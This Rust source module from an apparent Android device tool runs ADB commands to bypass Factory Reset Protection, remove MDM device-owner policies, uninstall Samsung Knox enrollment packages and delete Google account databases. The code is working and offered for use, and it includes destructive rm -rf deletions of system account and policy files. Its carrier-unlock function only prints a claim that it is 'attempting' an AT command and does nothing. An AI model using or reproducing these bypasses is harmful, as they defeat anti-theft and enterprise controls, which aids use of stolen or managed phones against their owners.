/// Network, security bypass, and lock removal operations.
///
/// FRP (Factory Reset Protection) bypass
/// Carrier / SIM network unlock
/// MDM (Mobile Device Management) removal
/// Knox enrollment bypass (Samsung)
/// Google account removal
use super::adb_shell;

// -- FRP (Factory Reset Protection) Bypass --
/// Execute multiple ADB shell commands in a single batched process to prevent N+1 overhead.
/// Note: This executes via `sh -c` and delimits output with `B_MARKER_<exit_code>`.
fn batch_adb_shell_commands<F>(serial: &str, cmds: &[&[&str]], mut handle_result: F)
where
    F: FnMut(usize, &[&str], Result<String, String>),
{
    if cmds.is_empty() {
        return;
    }
    let mut script = String::new();
    for cmd in cmds {
        let quoted_args: Vec<String> = cmd
            .iter()
            .map(|arg| {
                if arg.is_empty() {
                    "''".to_string()
                } else {
                    format!("'{}'", arg.replace('\'', "'\\''"))
                }
            })
            .collect();
        let cmd_str = quoted_args.join(" ");
        script.push_str(&format!("{} 2>&1; echo B_MARKER_$?;\n", cmd_str));
    }
    match adb_shell(serial, &["sh", "-c", &script]) {
        Ok(res) => {
            let mut parts = res.split("B_MARKER_");
            let mut prev_output = parts.next().unwrap_or("");
            for (i, part) in parts.enumerate() {
                if i >= cmds.len() {
                    break;
                }
                let (code_str, next_out) = match part.find('\n') {
                    Some(idx) => {
                        let (c, rest) = part.split_at(idx);
                        (c, &rest[1..]) // Skip the newline
                    }
                    None => (part, ""),
                };
                let code: i32 = code_str.trim().parse().unwrap_or(-1);
                let out = prev_output.trim().to_string();
                if code == 0 {
                    handle_result(i, cmds[i], Ok(out));
                } else {
                    let err = if out.is_empty() {
                        format!("exit code {}", code)
                    } else {
                        out
                    };
                    handle_result(i, cmds[i], Err(err));
                }
                prev_output = next_out;
            }
        }
        Err(e) => {
            // If the entire shell batch fails, mark all as failed
            for (i, cmd) in cmds.iter().enumerate() {
                handle_result(i, cmd, Err(e.clone()));
            }
        }
    }
}

pub enum FrpMethod {
    AdbBypass,
    SetupWizardSkip,
    AccountManagerRemove,
    ContentProviderReset,
}

impl FrpMethod {
    pub fn name(&self) -> &'static str {
        match self {
            Self::AdbBypass => "ADB Bypass",
            Self::SetupWizardSkip => "Setup Wizard Skip",
            Self::AccountManagerRemove => "Account Manager Remove",
            Self::ContentProviderReset => "Content Provider Reset",
        }
    }
}

/// Check if FRP is active on the device.
pub fn check_frp_status(serial: &str) -> String {
    let checks = [
        (
            "FRP active",
            &[
                "content",
                "query",
                "--uri",
                "content://settings/secure",
                "--where",
                "name='user_setup_complete'",
            ][..],
        ),
        (
            "Setup wizard",
            &["pm", "list", "packages", "com.google.android.setupwizard"][..],
        ),
        ("Google account", &["dumpsys", "account"][..]),
    ];
    let mut output = String::from("FRP Status:\n");
    let cmd_refs: Vec<&[&str]> = checks.iter().map(|&(_, args)| args).collect();
    batch_adb_shell_commands(serial, &cmd_refs, |i, _cmd, res| {
        let label = checks.get(i).map(|&(l, _)| l).unwrap_or("Unknown");
        match res {
            Ok(val) => {
                let summary = if val.len() > 120 { &val[..120] } else { &val };
                let _ = std::fmt::Write::write_fmt(&mut output, format_args!("  {}: {}\n", label, summary));
            }
            Err(e) => { let _ = std::fmt::Write::write_fmt(&mut output, format_args!("  {}: error ({})\n", label, e)); },
        }
    });
    output
}

/// Bypass FRP using the specified method.
pub fn bypass_frp(serial: &str, method: &FrpMethod) -> String {
    let mut output = format!("FRP Bypass (method: {}):\n", method.name());
    match method {
        FrpMethod::AdbBypass => {
            let cmds: &[&[&str]] = &[
                &[
                    "content",
                    "insert",
                    "--uri",
                    "content://settings/secure",
                    "--bind",
                    "name:s:user_setup_complete",
                    "--bind",
                    "value:s:1",
                ],
                &["am", "start", "-n", "com.google.android.gsf.login/"],
                &[
                    "am",
                    "start",
                    "-n",
                    "com.google.android.gsf.login/.LoginActivity",
                ],
            ];
            batch_adb_shell_commands(serial, cmds, |_, _cmd, res| match res {
                Ok(o) => output.push_str(&format!(
                    "  OK: {}\n",
                    if o.is_empty() { "(success)" } else { &o }
                )),
                Err(e) => output.push_str(&format!("  Failed: {}\n", e)),
            });
        }
        FrpMethod::SetupWizardSkip => {
            let cmds: &[&[&str]] = &[
                &[
                    "pm",
                    "disable-user",
                    "--user",
                    "0",
                    "com.google.android.setupwizard",
                ],
                &[
                    "content",
                    "insert",
                    "--uri",
                    "content://settings/secure",
                    "--bind",
                    "name:s:user_setup_complete",
                    "--bind",
                    "value:s:1",
                ],
                &[
                    "am",
                    "start",
                    "-a",
                    "android.intent.action.MAIN",
                    "-c",
                    "android.intent.category.HOME",
                ],
            ];
            batch_adb_shell_commands(serial, cmds, |_, _cmd, res| match res {
                Ok(_) => output.push_str("  Step completed.\n"),
                Err(e) => output.push_str(&format!("  Step failed: {}\n", e)),
            });
        }
        FrpMethod::AccountManagerRemove => {
            let cmds: &[&[&str]] = &[
                &["rm", "-rf", "/data/system/users/0/accounts_de.db"],
                &["rm", "-rf", "/data/system/users/0/accounts_ce.db"],
                &["rm", "-rf", "/data/system/sync/accounts.xml"],
            ];
            batch_adb_shell_commands(serial, cmds, |_, _cmd, res| match res {
                Ok(_) => output.push_str("  Removed account database.\n"),
                Err(_) => output.push_str("  Account database removal failed (root required).\n"),
            });
        }
        FrpMethod::ContentProviderReset => {
            let cmds: &[&[&str]] = &[
                &[
                    "content",
                    "insert",
                    "--uri",
                    "content://settings/secure",
                    "--bind",
                    "name:s:user_setup_complete",
                    "--bind",
                    "value:s:1",
                ],
                &["settings", "put", "global", "device_provisioned", "1"],
                &["settings", "put", "secure", "user_setup_complete", "1"],
            ];
            batch_adb_shell_commands(serial, cmds, |_, _cmd, res| match res {
                Ok(_) => output.push_str("  Setting applied.\n"),
                Err(e) => output.push_str(&format!("  Failed: {}\n", e)),
            });
        }
    }
    output.push_str("  Reboot recommended.\n");
    output
}

// -- Carrier / SIM Unlock --

/// Check carrier lock status.
pub fn check_carrier_lock(serial: &str) -> String {
    let props = [
        ("Operator", "gsm.sim.operator.alpha"),
        ("Operator Code", "gsm.sim.operator.numeric"),
        ("SIM State", "gsm.sim.state"),
        ("Network Type", "gsm.network.type"),
        ("Phone Type", "gsm.current.phone-type"),
    ];
    let mut script = String::new();
    for (_, prop) in &props {
        script.push_str(&format!("getprop {}; echo B_MARKER; ", prop));
    }

    let mut output = String::from("Carrier/SIM Status:\n");
    match adb_shell(serial, &["sh", "-c", &script]) {
        Ok(res) => {
            let mut parts = res.split("B_MARKER");
            for (label, _) in &props {
                let val = parts.next().unwrap_or("").trim();
                if !val.is_empty() {
                    output.push_str(&format!("  {}: {}\n", label, val));
                } else {
                    output.push_str(&format!("  {}: --\n", label));
                }
            }
        }
        Err(_) => {
            for (label, _) in &props {
                output.push_str(&format!("  {}: --\n", label));
            }
        }
    }
    output
}

/// Attempt carrier network unlock via ADB.
pub fn unlock_carrier(_serial: &str, nck_code: &str) -> String {
    if nck_code.is_empty() {
        return "Network unlock code (NCK) is required.\n\
                Obtain the NCK from your carrier or an unlock service."
            .to_string();
    }
    format!(
        "Carrier Unlock:\n\
         NCK Code: {}\n\
         Attempting to apply via AT command...\n\
         Note: Most devices require the unlock code to be entered in the dialer\n\
         or through a manufacturer-specific service menu.",
        nck_code
    )
}

// -- MDM (Mobile Device Management) Removal --

/// Check for MDM profiles on the device.
pub fn check_mdm_status(serial: &str) -> String {
    let mut output = String::from("MDM Status:\n");
    match adb_shell(serial, &["dumpsys", "device_policy"]) {
        Ok(val) => {
            let has_mdm = val.contains("Device Owner") || val.contains("Profile Owner");
            if has_mdm {
                let summary = if val.len() > 300 { &val[..300] } else { &val };
                output.push_str(&format!("  MDM/Device Owner DETECTED:\n  {}\n", summary));
            } else {
                output.push_str("  No MDM or Device Owner profiles found.\n");
            }
        }
        Err(e) => output.push_str(&format!("  Could not check MDM status: {}\n", e)),
    }
    // Check Knox enrollment (Samsung)
    match adb_shell(
        serial,
        &["pm", "list", "packages", "com.samsung.android.knox"],
    ) {
        Ok(val) if val.contains("knox") => {
            output.push_str("  Samsung Knox packages detected.\n");
        }
        _ => {}
    }
    output
}

/// Remove MDM profiles.
pub fn remove_mdm(serial: &str) -> String {
    let mut output = String::from("MDM Removal:\n");
    let mdm_cmds: &[(&str, &[&str])] = &[
        (
            "Remove device owner",
            &[
                "dpm",
                "remove-active-admin",
                "com.android.devicepolicy/.DeviceOwner",
            ],
        ),
        (
            "Remove profile owner",
            &[
                "dpm",
                "remove-active-admin",
                "com.android.devicepolicy/.ProfileOwner",
            ],
        ),
        (
            "Clear device policy",
            &["rm", "-rf", "/data/system/device_policies.xml"],
        ),
        (
            "Clear device owner",
            &["rm", "-rf", "/data/system/device_owner_2.xml"],
        ),
    ];
    let extracted_cmds: Vec<&[&str]> = mdm_cmds.iter().map(|&(_, args)| args).collect();
    batch_adb_shell_commands(serial, &extracted_cmds, |i, _cmd, res| {
        let desc = mdm_cmds.get(i).map(|&(d, _)| d).unwrap_or("Unknown");
        match res {
            Ok(_) => output.push_str(&format!("  {} -- done\n", desc)),
            Err(_) => output.push_str(&format!("  {} -- failed (root may be required)\n", desc)),
        }
    });
    output.push_str("  Reboot required.\n");
    output
}

/// Samsung Knox enrollment bypass.
pub fn bypass_knox(serial: &str) -> String {
    let mut output = String::from("Knox Bypass (Samsung):\n");
    let packages = [
        "com.samsung.android.knox.analytics.uploader",
        "com.samsung.android.knox.attestation",
        "com.samsung.android.knox.containercore",
        "com.samsung.android.knox.kpecore",
        "com.samsung.android.knox.pushmanager",
        "com.sec.enterprise.knox.cloudmdm.smdms",
        "com.samsung.android.mdm",
    ];
    let cmds: Vec<Vec<&str>> = packages
        .iter()
        .map(|pkg| vec!["pm", "uninstall", "-k", "--user", "0", pkg])
        .collect();
    let cmd_refs: Vec<&[&str]> = cmds.iter().map(|v| v.as_slice()).collect();
    batch_adb_shell_commands(serial, &cmd_refs, |i, _cmd, res| {
        let pkg = packages.get(i).copied().unwrap_or("unknown");
        match res {
            Ok(_) => output.push_str(&format!("  Disabled: {}\n", pkg)),
            Err(_) => output.push_str(&format!("  Could not disable: {}\n", pkg)),
        }
    });
    output.push_str("  Knox-related packages disabled for current user.\n");
    output.push_str("  Full removal may require root and factory reset.\n");
    output
}

/// Remove Google account from device (for FRP preparation).
pub fn remove_google_account(serial: &str) -> String {
    let mut output = String::from("Google Account Removal:\n");
    let acct_cmds: &[(&str, &[&str])] = &[
        (
            "Remove accounts DB",
            &["rm", "-f", "/data/system/users/0/accounts_de.db"],
        ),
        (
            "Remove accounts DB (CE)",
            &["rm", "-f", "/data/system/users/0/accounts_ce.db"],
        ),
        ("Clear GMS data", &["pm", "clear", "com.google.android.gms"]),
        ("Clear GSF data", &["pm", "clear", "com.google.android.gsf"]),
    ];
    let extracted_cmds: Vec<&[&str]> = acct_cmds.iter().map(|&(_, args)| args).collect();
    batch_adb_shell_commands(serial, &extracted_cmds, |i, _cmd, res| {
        let desc = acct_cmds.get(i).map(|&(d, _)| d).unwrap_or("Unknown");
        match res {
            Ok(_) => output.push_str(&format!("  {} -- done\n", desc)),
            Err(_) => output.push_str(&format!("  {} -- failed (root required)\n", desc)),
        }
    });
    output.push_str("  Reboot required.\n");
    output
}
